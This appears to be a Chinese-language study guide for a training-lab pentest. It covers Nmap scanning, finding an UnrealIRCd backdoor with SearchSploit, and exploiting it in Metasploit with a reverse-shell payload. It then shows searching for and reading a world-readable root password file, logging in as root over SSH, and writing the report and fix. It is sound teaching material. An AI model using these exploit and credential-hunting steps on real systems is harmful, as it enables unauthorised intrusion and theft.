## 1. 核心觀念

滲透測試不是單一工具或單一技巧，而是一套「像攻擊者般找出缺口、像工程師般驗證原因、像顧問般說明風險」的思考方式。測試者可能需要：

- 以程式設計者的角度理解應用程式如何失敗。
- 以系統管理員的角度辨識不合理的服務、權限與設定。
- 以 SOC／防禦團隊的角度思考哪些行為會被記錄、偵測或攔截。
- 以攻擊者的角度持續追問：「系統遺漏了什麼？哪些資訊可以串成攻擊路徑？」

### 1.1 什麼是基礎設施滲透測試

基礎設施滲透測試（Infrastructure Penetration Test，常簡稱 Infra Pentest）是針對網路上可存取裝置進行的安全評估。對象可以是伺服器、印表機、防火牆、路由器或任何具有網路介面的設備；設備可能位於網際網路，也可能只存在於內部 LAN。

### 1.2 標準攻擊／測試生命週期

| 階段 | 核心問題 | 主要產出 |
|---|---|---|
| 枚舉（Enumeration） | 已知什麼？還缺什麼？ | 主機、連接埠、服務、版本與暴露面清單 |
| 弱點分析（Vulnerability Analysis） | 哪些發現能對應到弱點或錯誤設定？ | 經版本與前置條件驗證的候選弱點 |
| 初始存取（Initial Access） | 哪條經授權的路徑可證明風險？ | 最小必要的立足點與證據 |
| 權限提升（Privilege Escalation） | 進入主機後，能否由低權限升至高權限？ | 本機枚舉結果、提升路徑與影響 |
| 報告（Reporting） | 如何讓客戶理解、重現並修復？ | 管理摘要、技術細節、證據與修補建議 |

這些階段不是一次性的直線流程。取得初始存取後，需要從主機內部**重新枚舉**，再分析本機權限、敏感檔案、服務與憑證；每當取得新資訊，都應回頭修正假設。

## 2. 學習目標與先備能力

### 2.1 學習目標

1. 使用合適的工具與參數掃描 Linux 主機。
2. 由掃描結果辨認服務與版本，研究可用弱點。
3. 在受控環境中使用現有模組取得低權限立足點。
4. 枚舉 Linux 本機檔案並辨識權限提升線索。
5. 把完整攻擊路徑轉換成可交付、可修復的報告內容。

### 2.2 先備能力

- **Nmap**：理解 TCP 連接埠、服務偵測、NSE 腳本與輸出保存。
- **Metasploit Framework**：理解模組、payload、RHOSTS、LHOST、RPORT 與 session。
- Linux 基礎：檔案權限、使用者與群組、Shell、標準輸出／錯誤重新導向。

## 3. 枚舉：先理解目標，再採取動作

### 3.1 為什麼枚舉最重要

未枚舉就嘗試漏洞或密碼，本質上只是在猜測。良好的枚舉要回答：

- 哪些主機在線？
- 哪些 TCP／UDP 連接埠開放？
- 每個連接埠實際運行什麼服務？
- 服務與作業系統版本為何？
- 是否存在匿名存取、分享目錄、弱認證或資訊洩漏？
- 掃描結果能否互相驗證，而非只依賴單一 banner？

倉促枚舉容易漏掉真正的攻擊面。實務上，「找到」與「沒找到」的差異，往往不是工具不同，而是有沒有保存輸出、追蹤每條線索並重新驗證。

### 3.2 使用 Nmap 進行基礎掃描

```bash
nmap -sV -sC -oN scan.txt MACHINE_IP
```

參數逐項說明：

- `-sV`：對開放連接埠進行服務與版本探測。版本資訊是搜尋漏洞的重要線索，但 banner 可能被修改，仍需交叉驗證。
- `-sC`：執行 Nmap 預設 NSE 腳本，可能取得 banner、協定資訊、支援的認證方式及其他常見資訊。
- `-oN scan.txt`：以一般可讀格式保存結果，方便後續比較、引用證據與撰寫報告。
- `MACHINE_IP`：替換成靶場當次提供的 IP；範例中的 IP、連接埠或版本可能與實際環境不同。

> 建議先記錄命令、執行時間、來源 IP 與目標 IP。必要時再依授權範圍補做全連接埠掃描，而不是假設預設的常見 1,000 個連接埠涵蓋全部服務。

### 3.3 如何閱讀範例結果

題目範例辨識出兩個開放的 TCP 連接埠：

| Port | Service | 掃描辨識結果 | 初步判斷 |
|---:|---|---|---|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu | 常見管理介面；不可僅因搜尋結果含「OpenSSH」便認定可利用 |
| 8889/tcp | IRC | UnrealIRCd 5.1.6.1（畫面顯示為 `Unreal5.1.6.1`） | 非預期服務，且回傳具體版本／主機資訊，值得優先研究 |

因此，題目「除了 22，還有哪個連接埠開放？」的答案是 **8889**。

掃描輸出的其他欄位也有價值：

- `Host is up` 與 latency：確認主機可達及大致網路延遲。
- `Not shown: ... closed tcp ports`：代表掃描過但未開放，不等於所有 65,535 個連接埠均已檢查。
- SSH host key：可在後續連線時核對主機身分，發生變化時應提高警覺。
- IRC 的 users、servers、version、uptime：可協助辨認產品、部署狀態與主機名。
- `Service Info`／CPE：是 Nmap 的推測結果，可用於分類，但不應被視為百分之百正確。

## 4. 弱點分析：把枚舉資訊連成可驗證的假設

### 4.1 分析順序

對每項服務依序詢問：

1. 產品與版本是否真的吻合？
2. 該版本是否過時或存在已知 CVE／公開 exploit？
3. 弱點是否適用於目前的作業系統、編譯方式或設定？
4. 是否需要已驗證帳號、本機權限或其他前置條件？
5. 公開程式碼來源是否可信？會不會破壞服務或包含惡意內容？
6. 有沒有風險更低的驗證方式？

搜尋「產品 + 版本 + exploit」只能建立候選清單，不能證明系統有弱點。例如針對範例 OpenSSH 版本搜尋，可能只得到理論性、舊版本或特定發行版的結果，因此不能為了「有結果」而硬套漏洞。

### 4.2 使用 SearchSploit

SearchSploit 可離線查詢 Exploit-DB 的公開 exploit 與揭露資料：

```bash
searchsploit openssh
searchsploit unrealircd
```

結果通常包含：

- `Exploit Title`：受影響產品、版本、漏洞類型或使用前提。
- `Path`：本機 Exploit-DB 鏡像中的相對路徑；它不是網址。

題目所問 UnrealIRCd 的 **Remote Downloader/Execute** 腳本路徑為：

```text
linux/remote/13853.pl
```

找到 PoC 後仍應先檢視原始碼與註解，核對目標版本、預設連接埠、參數、回連行為與破壞性。不要在不了解程式碼的情況下直接執行。

### 4.3 本案例的根因

課程靶場把目標呈現為 UnrealIRCd 5.1.6.1，並提供相應的後門練習模組；公開 SearchSploit 結果的標題／適用版本則可能不同。這個案例的重要觀念不是把搜尋結果看到的版本直接套到目標，而是理解：

- 軟體供應鏈遭竄改也會形成遠端程式碼執行風險。
- 相同產品名稱不代表每個安裝都受影響，仍須確認版本與來源。
- 弱點資料庫結果只是線索；服務版本與模組適用條件必須吻合。

## 5. 初始存取：使用 Metasploit 驗證攻擊路徑

### 5.1 模組選擇流程

啟動並搜尋：

```text
msfconsole
search unrealircd
use 0
show options
```

畫面中的索引 `0` 對應課程環境提供的 `exploit/unix/irc/unreal_ircd_5161_backdoor`。不同 Metasploit 版本或靶場可能沒有相同的自訂模組，顯示名稱也可能不同；應以當次 `search` 結果、模組說明與實際服務版本為準，不要盲目輸入記憶中的路徑，也不要把不同版本的公開 PoC 當作已驗證適用。

關鍵選項：

- `RHOSTS`（Remote Hosts）：目標主機 IP，為本案例必填值。
- `RPORT`（Remote Port）：目標 IRC 服務連接埠；範例為 `8889`，但必須以自己的掃描結果為準。
- `LHOST`（Local Host）：目標回連時所連到的攻擊端介面／IP，必須是靶機可達的地址。
- `LPORT`（Local Port）：本機監聽回連的連接埠；要避免衝突，也必須符合實驗網路規則。
- `CHOST`／`CPORT`：本機用戶端來源設定，通常不是本案例的必要欄位。

設定遠端目標：

```text
set RHOSTS MACHINE_IP
```

### 5.2 選擇 payload

先查看模組相容的 payload：

```text
show payloads
```

當遠端環境與可用工具未知時，課程選用通用 Unix reverse payload：

```text
set payload cmd/unix/reverse
show options
set LHOST CONNECTION_IP
set LPORT 443
```

選擇 reverse shell 的意義是：由目標主動連回測試機的 listener。`LHOST` 應使用 VPN／實驗網路中目標可路由到的介面地址，而不一定是測試機的公網或區網地址。`443` 在此只是課程示例，不代表它一定能穿越控制措施，也不應藉此規避客戶監控。

所有值確認後，在授權靶場執行：

```text
exploit
```

取得 session 後的最小驗證：

```bash
whoami
```

範例結果為低權限使用者 `webmaster`。這證明已取得立足點，但還不是 root，也不代表可以跳過後續本機枚舉。

### 5.3 「啞 Shell」與互動式終端機

初次取得的 reverse shell 常是功能有限的 dumb shell，可能缺少：

- job control；
- Tab 補全；
- 完整 TTY；
- 需要互動輸入的程式支援。

因此 `su`、某些 `sudo` 或要求安全讀取密碼的工具可能無法正常工作。成熟的測試流程應在不破壞系統的前提下取得適當 TTY，或改用合法的新 SSH 工作階段；切勿把工具限制誤判為帳密無效。

範例 user flag 位於：

```text
/home/webmaster/flag.txt
```

畫面顯示的 user-level flag 為 `THM{Pwned-Your-First-Machine}`。Flag 是靶場的完成證據；實務報告則應保存足以證明風險、但避免洩漏不必要敏感資料的截圖或輸出。

## 6. 後滲透與 Linux 權限提升枚舉

### 6.1 重新枚舉的方向

取得低權限 shell 後，可在授權範圍內檢查：

- 當前使用者、群組與 `sudo` 權限；
- 作業系統、核心與套件版本；
- SUID／SGID 檔案與 Linux capabilities；
- cron、systemd timers、可寫腳本及服務設定；
- 檔案權限錯誤、備份、設定檔、歷史紀錄與明文憑證；
- 僅綁定 localhost 的服務、執行中程序與網路連線。

每項發現都要核對可利用條件。看到 SUID binary 或舊核心不等於一定能提升權限；錯誤嘗試也可能造成服務中斷。

### 6.2 搜尋名稱包含 password 的檔案

課程命令：

```bash
find / -name 'password*' 2>/dev/null
```

逐段解釋：

- `find /`：從根目錄開始遞迴搜尋整個檔案系統。
- `-name 'password*'`：搜尋名稱以 `password` 開頭的項目；引號可避免 shell 先在目前目錄展開 `*`。
- `2>/dev/null`：把檔案描述符 2（標準錯誤）導向 `/dev/null`，隱藏 permission denied 等錯誤。

這是很寬泛且可能耗時的搜尋，只能找**檔名**符合模式的項目，不能保證內容含密碼，也會產生大量無關結果。實務中應控制範圍、避免不必要的 I/O，並檢查檔案擁有者、權限與內容敏感度。

範例中最異常的結果是：

```text
/etc/password.txt
```

讀取方式：

```bash
cat /etc/password.txt
```

這個檔案含有 root 明文憑證，而且低權限使用者可讀，形成直接的權限提升路徑。注意它與標準的 `/etc/passwd` 不同：

- `/etc/passwd` 是標準帳號資料檔，通常可讀，但現代系統不應在其中保存明文密碼。
- `/etc/shadow` 保存密碼雜湊並應嚴格限制存取。
- `/etc/password.txt` 是本案例額外建立的不安全檔案，並非 Linux 的標準認證檔。

### 6.3 以 SSH 建立正常工作階段

由於原 reverse shell 不一定能安全輸入密碼，課程改從新的本機終端連線：

```bash
ssh root@MACHINE_IP
```

輸入已發現的密碼後，即可在範例環境取得 root 工作階段。第一次連線還應核對 SSH host key；實務測試中使用取得的憑證前，也要確認授權範圍允許憑證重用。

root flag 的位置為：

```text
/root/flag.txt
```

提供的畫面沒有完整顯示 root flag 值，因此本筆記不臆測答案；應在自己的靶場工作階段中讀取並提交。

## 7. 報告：真正交付給客戶的成果

再精彩的技術操作，如果無法讓客戶理解風險及採取修補行動，仍是不完整的滲透測試。報告應區分管理者與工程人員的需求。

### 7.1 建議報告結構

1. **封面**：報告名稱、測試者姓名／Email、客戶、日期、機密標示與版本控制。
2. **目錄**（可選）：長篇報告方便導覽。
3. **執行摘要（Executive Summary）**：面向提出委託的管理者，以非技術語言說明範圍、整體風險、完成事項、商業影響與優先行動。
4. **技術摘要（Technical Summary，可選）**：面向工程經理，說明技術影響、共同根因與修補優先順序。因此題目「哪個報告章節以工程經理為受眾？」答案是 **Technical Summary**。
5. **弱點總表**：依嚴重度排序，讓管理者與工程師快速排定處理次序。
6. **個別發現詳情**：描述、證據、重現步驟、影響、風險分級與修補建議，主要供實際修復的人員使用。
7. **附錄**：測試範圍、方法、工具版本、完整但經去敏的證據等。

### 7.2 本案例發現範本

#### 標題

Root Password Stored in Plaintext（Root 密碼以明文保存）

#### 嚴重度

**Critical**。最終分級仍應配合組織標準、可利用性、受影響資產價值與補償控制，而不是只看漏洞名稱。

#### 描述與影響

Root 密碼以明文保存在 `/etc/password.txt`，且低權限使用者可讀。任何已取得 shell 的使用者都能取回 root 憑證、透過 SSH 取得最高權限，進而讀取或修改所有資料、建立持久化機制、停用安全控制或完全控制系統。

#### 經去敏的重現步驟

1. 在受控測試中取得低權限 shell。
2. 確認低權限帳號可讀 `/etc/password.txt`。
3. 記錄檔案權限與已遮蔽的內容證據，不在報告中暴露完整密碼。
4. 經授權後，以發現的帳密驗證是否能透過 SSH 取得 root 權限。

#### 修補建議

1. 立即刪除明文密碼檔，並確認備份、映像、日誌及版本控制中沒有副本。
2. 立刻輪替 root 密碼及任何重用該密碼的帳號；把既有憑證視為已外洩。
3. 檢視登入與稽核紀錄，確認是否曾遭未授權存取。
4. 停用 SSH 直接 root 登入，改以具名低權限帳號搭配受控的 `sudo`。
5. 採用合適的 secrets manager；系統密碼應以強雜湊保存在權限受限的 `/etc/shadow`，而不是自行建立文字檔。
6. 落實最小權限、檔案權限基準與持續組態稽核，避免同類問題復發。

### 7.3 證據品質

每項發現至少應記錄：

- 受影響資產與服務；
- 測試日期／時間與命令；
- 實際結果與必要截圖；
- 前置條件及已取得的權限；
- 可重現但不造成額外傷害的步驟；
- 敏感資訊遮蔽方式；
- 清楚、可執行且有優先順序的修補方案。

## 8. 完整攻擊鏈與根因整理

```text
Nmap 枚舉
  → 發現 8889/tcp 的 UnrealIRCd
  → 依產品與版本研究公開弱點
  → 以相符的 Metasploit 模組驗證後門風險
  → 取得 webmaster 低權限 shell
  → 從主機內重新枚舉敏感檔案
  → 發現低權限可讀的 /etc/password.txt
  → 驗證 root 憑證可用
  → 證明主機可被完全控制
  → 保存最小必要證據並提出分層修補建議
```

此鏈條包含至少兩個應分別處理的根因：

1. **有弱點／遭植入後門的網路服務**造成初始存取。
2. **明文憑證及錯誤檔案權限**讓低權限存取升級為 root 控制。

只修補其中一點並不足夠：更新或移除 UnrealIRCd 可阻斷已知入口，但已洩漏的 root 密碼仍需輪替；刪除密碼檔也無法消除暴露服務的遠端風險。

### 11.1 弱點、漏洞與錯誤設定的差異

- **弱點（weakness）**是廣義的不安全狀態，例如把密碼放在一般文字檔。
- **漏洞（vulnerability）**通常是可被利用且具有明確影響的弱點，可能有 CVE，但「沒有 CVE」不代表沒有風險。
- **錯誤設定（misconfiguration）**是產品本身可能沒有程式缺陷，卻因部署方式不安全而產生風險，例如讓低權限使用者讀取 root 憑證。
- **Exploit** 是利用方式，不等同漏洞本身；找到 exploit 也不等同已證明目標受影響。

## 12. 更完整的枚舉策略

### 12.1 主機可達不等於沒有服務

主機可能封鎖 ICMP echo，因此 ping 沒回應不必然代表離線。反之，主機可達也不代表目標連接埠開放。應分開記錄：

1. 名稱解析是否成功；
2. 網路路由是否存在；
3. 主機探索是否有回應；
4. 特定傳輸層連接埠的狀態；
5. 應用層服務是否正常回應。

### 12.2 Nmap 常見連接埠狀態

| 狀態 | 意義 | 下一步 |
|---|---|---|
| `open` | 有應用程式正在接受連線 | 進行服務、版本與協定枚舉 |
| `closed` | 主機可達，但該連接埠沒有服務監聽 | 通常不是當下攻擊面，但可證明主機在線 |
| `filtered` | 封包被防火牆或網路設備丟棄，Nmap 無法判定 | 核對範圍、掃描來源及網路控制，不要直接視為關閉 |
| `open|filtered` | 無法區分開放或被過濾，UDP 掃描常見 | 使用協定特定探測並延長等待時間 |
| `unfiltered` | 可到達，但特定掃描方式無法判斷是否開放 | 改用其他掃描技術確認 |

### 12.3 分階段掃描思路

在授權範圍內，掃描可以分成三層，以免一次輸出太多資訊：

```bash
# 第一層：快速建立常見 TCP 服務輪廓
nmap -sV -sC -oA scans/initial MACHINE_IP

# 第二層：確認是否有高編號 TCP 連接埠被遺漏
nmap -p- --min-rate 1000 -oA scans/all-tcp MACHINE_IP

# 第三層：只對第二層找到的連接埠做深入版本與腳本探測
nmap -sV -sC -p 22,8889 -oA scans/detail MACHINE_IP
```

- `-p-` 代表 TCP 連接埠 1–65535；掃描時間與負載會增加，必須符合測試規則。
- `--min-rate 1000` 指示最低送包速率，並不適合所有網路；不穩定或生產環境應降低速率。
- `-oA` 同時輸出 normal、XML 與 grepable 格式，分別適合閱讀、工具解析與快速查找。
- 深入掃描應指定已知開放埠，降低不必要的流量與等待。

> UDP 與 TCP 是不同的傳輸協定。完成 TCP 掃描不能推論 UDP 沒有服務；但 UDP 掃描通常較慢，應依範圍及資產用途規劃，而不是不加判斷地掃描所有連接埠。

### 12.4 Banner 與版本結果的可信度

服務可能隱藏、偽造或延遲回傳版本資訊，反向代理也可能讓掃描結果只代表前端設備。建議建立「信心程度」：

- **高**：多個獨立來源一致，例如服務協定行為、套件資訊與管理者提供的資產資料相符。
- **中**：Nmap 探測與 banner 一致，但無法登入主機核對套件。
- **低**：僅依預設連接埠或模糊回應猜測。

在報告中應區分「觀察到 `8889/tcp` 回應 IRC 協定」與「確認後端套件確切版本」；前者是直接證據，後者可能仍是推論。

### 12.5 建議的枚舉紀錄表

| 時間（UTC） | 資產 | Port／Protocol | Service | Version | 證據來源 | 信心 | 下一步 |
|---|---|---:|---|---|---|---|---|
| YYYY-MM-DD HH:MM | `MACHINE_IP` | 22/tcp | SSH | OpenSSH 9.6p1 | Nmap `-sV` | 中 | 搜尋版本資訊並檢查認證政策 |
| YYYY-MM-DD HH:MM | `MACHINE_IP` | 8889/tcp | IRC | UnrealIRCd 5.1.6.1 | Nmap/NSE banner | 中 | 核對版本、模組與適用條件 |

## 13. 弱點驗證決策表

### 13.1 從搜尋結果到可測試假設

| 檢查項目 | 要回答的問題 | 不符合時的處理 |
|---|---|---|
| 產品 | exploit 是否針對同一軟體，而非名稱相似產品？ | 排除候選項 |
| 版本 | 目標版本是否位於受影響範圍？ | 不執行，繼續查證 |
| 平台／架構 | Linux、Windows、x86、ARM 等條件是否相符？ | 尋找相符版本或替代驗證方式 |
| 設定 | 漏洞是否要求特定模組、功能或不安全設定？ | 先以低風險方式確認設定 |
| 認證 | 是否需要有效帳密或既有本機權限？ | 記錄前置條件，不能宣稱未驗證的影響 |
| 網路 | 目標能否連到測試端？是否有 NAT／防火牆？ | 修正合法路由或改用不需回連的驗證方式 |
| 破壞性 | 是否可能造成當機、資料變更或服務中斷？ | 取得額外批准、安排維護窗或只做安全驗證 |
| 來源可信度 | 程式碼是否可讀、來源是否可追溯？ | 不直接執行未知二進位檔 |

### 13.2 漏洞研究應保存哪些資訊

- 公告或資料庫名稱、識別碼與查詢日期；資料庫內容會更新，因此日期很重要。
- 受影響與不受影響版本。
- 利用所需權限、使用者互動與網路位置。
- 成功後可能造成的機密性、完整性與可用性影響。
- 供應商修補版本、緩解方式與已知副作用。
- PoC 的來源、雜湊值及人工檢閱結果。

### 13.3 CVE、CVSS 與 exploit availability

- **CVE** 是公開弱點的識別碼，不直接表示嚴重度，也不保證存在公開 exploit。
- **CVSS** 是標準化的技術嚴重度評分，但沒有納入所有組織脈絡，例如該資產是否保存關鍵資料。
- **公開 PoC** 會提高可利用性的可信度，但 PoC 可能不完整、只適用特定建置，甚至包含惡意功能。
- 實務優先順序應綜合技術嚴重度、暴露程度、資產價值、威脅情報與補償控制。

## 14. Metasploit 深入說明

### 14.1 模組、target、payload 的關係

```text
exploit module  → 觸發目標弱點的方法
target          → 模組內特定平台／版本的利用設定
payload         → 利用成功後執行的功能
handler         → 接收 reverse payload 回連的測試端元件
session         → 成功建立後可管理的互動通道
```

模組顯示 `Rank: excellent` 只代表模組作者對穩定性的分類，不代表它一定適用目標、一定成功或沒有風險。`Check: No` 則表示模組未提供安全的自動檢查方法，此時更要先人工核對版本與條件。

### 14.2 `show options` 應如何閱讀

Metasploit 的選項表通常包含：

- **Name**：選項名稱。
- **Current Setting**：目前值；空白表示尚未設定。
- **Required**：是否必須提供。`yes` 只代表模組執行需要，不代表預設值一定正確。
- **Description**：用途與格式。

執行前可用以下心智檢查：

```text
RHOSTS ＝ 我要測試誰？
RPORT  ＝ 目標服務在哪個連接埠？
LHOST  ＝ 目標要回連到我的哪個可達地址？
LPORT  ＝ 我的 handler 在哪個連接埠等待？
PAYLOAD＝ 成功後要用什麼最低影響方式證明執行能力？
```

### 14.3 Bind shell 與 reverse shell

| 類型 | 連線方向 | 優點 | 常見限制 |
|---|---|---|---|
| Reverse shell | 目標連回測試端 | 常較適合目標位於 NAT 後方的環境 | 目標的對外連線可能被 egress firewall 阻擋 |
| Bind shell | 目標開啟監聽，測試端連入 | 測試端不需開 listener 接受回連 | 入站防火牆、NAT 及連接埠衝突常會阻擋 |

選擇哪一種應依網路拓撲與授權規則，而不是以「繞過監控」為目的。任何 listener 都應限制於測試所需介面，完成後立即停止。

### 14.4 成功與失敗訊息的判讀

- `Started reverse TCP handler`：只代表 handler 已啟動，不代表 exploit 成功。
- `Command shell session opened`：代表已建立 session，但仍要用 `whoami`、主機名等最小命令確認上下文。
- 沒有 session：可能是版本不符、路由錯誤、`LHOST` 選錯、防火牆阻擋或模組本身失敗。
- session 很快中斷：可能是 payload 不相容、shell 程序結束、網路逾時或端點防護介入。

## 15. Linux 本機枚舉深入說明

### 15.1 先建立目前權限與系統基線

在受控靶場可依序查看：

```bash
whoami               # 當前有效使用者
id                   # UID、主要群組與附加群組
hostname             # 目前主機名稱
uname -a             # 核心與架構概況
cat /etc/os-release  # Linux 發行版資訊
sudo -l              # 當前使用者被允許執行的 sudo 規則（可能要求密碼）
```

這些命令各自回答不同問題。例如 `whoami` 顯示名稱，但 `id` 還能顯示附加群組；某些高權限群組（如可管理容器或日誌的群組）也可能擴大影響。

### 15.2 檔案權限應如何判讀

執行 `ls -l /etc/password.txt` 可能看到類似：

```text
-rw-r--r-- 1 root root 20 Mar 17 08:00 /etc/password.txt
```

可拆成：

- 第一個字元 `-`：一般檔案；`d` 則是目錄。
- `rw-`：檔案擁有者可讀、可寫。
- `r--`：所屬群組可讀。
- `r--`：其他使用者也可讀，正是低權限帳號能取得密碼的原因。
- `root root`：擁有者與所屬群組均為 root；**由 root 擁有不代表其他人不能讀取**，仍要查看 mode bits 或 ACL。

也應檢查 `getfacl` 所顯示的 ACL，因為 ACL 可能在傳統 `rwx` 權限之外另行授權。

### 15.3 常見權限提升面向

| 類別 | 要找什麼 | 為何有風險 |
|---|---|---|
| `sudo` 規則 | 可免密碼或以 root 執行的程式 | 某些程式可啟動 shell、寫檔或載入外部內容 |
| SUID／SGID | 非預期、可寫或功能強大的特殊權限程式 | 執行時可能帶有檔案擁有者／群組權限 |
| Capabilities | `cap_setuid`、`cap_dac_read_search` 等 | 讓程序擁有部分 root 能力 |
| 排程工作 | root 執行但低權限可修改的腳本或路徑 | 可讓攻擊者的內容被高權限排程執行 |
| 服務設定 | 可寫 unit、啟動腳本或環境檔 | 服務重啟時可能以 root 執行被修改的內容 |
| 憑證 | 設定檔、備份、history、私鑰及 token | 可能允許橫向移動或切換至高權限帳號 |
| 核心漏洞 | 明確受影響的核心版本與設定 | 通常影響高，但失敗可能造成系統當機，應最後考慮 |

枚舉的原則是先找**低風險、可明確證明、易於修補**的設定問題，再考慮可能造成系統不穩定的核心 exploit。

### 15.4 明文密碼發現後的資料處理

1. 不在一般聊天、ticket 或未加密筆記貼上完整密碼。
2. 證據只顯示足以證明內容為憑證的局部，其他字元遮蔽。
3. 記錄檔案路徑、擁有者、權限及取得它的使用者身分。
4. 只有在規則允許時才驗證帳密，且避免多次登入觸發鎖定或影響服務。
5. 透過指定的安全通道立即通知客戶輪替，不必等到最終報告。

## 16. 報告風險評估與複測

### 16.1 以 CIA 說明影響

- **機密性（Confidentiality）**：root 可讀取主機上的所有業務資料與憑證。
- **完整性（Integrity）**：root 可修改程式、設定、日誌與資料。
- **可用性（Availability）**：root 可停止服務、刪除資料或關閉主機。

本案例三者都可能受到重大影響，因此不能只寫「攻擊者能登入」，還要說明登入後對業務資產造成什麼後果。

### 16.2 嚴重度與優先順序不是同一件事

- **嚴重度**描述弱點若被利用時的技術影響與可利用性。
- **修補優先順序**還要考慮是否對外暴露、是否已被利用、資產價值、修補難度與現有防護。
- 一個 Critical 發現通常需要緊急處理，但報告仍應提供短期緩解與長期根治方案，避免只寫「立即更新」。

### 16.3 修補層次

| 層次 | 本案例可採措施 | 目的 |
|---|---|---|
| 立即遏止 | 限制 `8889/tcp`、隔離受影響主機、輪替 root 密碼 | 快速降低持續遭利用的可能性 |
| 根因修復 | 移除後門版本、重建可信主機、刪除明文憑證 | 真正消除已知弱點與不安全資料 |
| 強化 | 禁止 SSH root 直登、最小權限、egress 控制 | 限制類似事件的成功率與影響 |
| 偵測 | 監控異常 IRC 流量、root 登入與敏感檔案建立 | 提高發現既有或再次入侵的能力 |
| 預防復發 | 套件來源驗證、組態基準、secret scanning | 從流程面阻止相同根因重現 |

### 16.4 複測（Retest）如何判定通過

複測不只確認檔案被刪除，而應逐項驗證：

1. 原本的 UnrealIRCd 弱點路徑已無法重現。
2. `8889/tcp` 若非業務必要已關閉；若仍需要，服務已更新且存取受限。
3. `/etc/password.txt` 及其備份副本已移除。
4. 舊 root 密碼已失效，且沒有其他帳號重用。
5. SSH root 直接登入政策已按建議調整。
6. 日誌與監控能辨識本次攻擊鏈中的關鍵行為。

複測報告應標示 `Fixed`、`Partially Fixed`、`Not Fixed` 或 `Risk Accepted`，附上新證據與日期；不能因客戶口頭表示已修補就直接關閉發現。

## 17. 常見問題與故障排除

### 17.1 Nmap 只看到 22，沒有 8889

- 確認使用的是本次靶場新分配的 `MACHINE_IP`。
- 確認 VPN／AttackBox 連線仍有效，且目標主機已完全啟動。
- 檢查是否只掃描特定埠；必要時在授權範圍內使用 `-p-`。
- 重新掃描前先保存第一次結果，因為服務狀態變化本身也是資訊。

### 17.2 SearchSploit 找不到相同結果

- 本機 Exploit-DB 索引可能較舊或課程環境可能使用自訂資料。
- 放寬搜尋字串，例如由完整版本改成 `searchsploit unrealircd`。
- 不要因路徑不同便下載不明網站的程式碼；應核對可信來源與版本。
- SearchSploit 有結果也不能取代適用性驗證。

### 17.3 Metasploit 找不到畫面中的模組

- 課程可能提供自訂模組，而一般安裝版沒有。
- 使用 `search unrealircd` 查看當前版本實際提供的項目，不要假設索引永遠是 `0`。
- 讀取 `info`，確認模組說明、參考資料、targets 與 options。
- 模組名稱或版本不符時應停止，不要改用相似模組碰運氣。

### 17.4 Handler 啟動但收不到 shell

- 核對 `LHOST` 是否為目標可達的 VPN／實驗介面地址。
- 核對 `RHOSTS`、`RPORT` 及 payload 是否正確。
- 確認本機 `LPORT` 未被占用，且網路政策允許回連。
- Handler 啟動不是成功證據；沒有 session 時不可在報告宣稱已取得遠端執行。

### 17.5 `su` 或 `sudo` 無法輸入密碼

- reverse shell 可能沒有完整 TTY，並非密碼一定錯誤。
- 題目流程採用新的 `ssh root@MACHINE_IP` 工作階段來取得互動式密碼提示。
- 實務中不得為了方便而修改 SSH 設定或新增帳號，除非規則明確允許並有清理計畫。
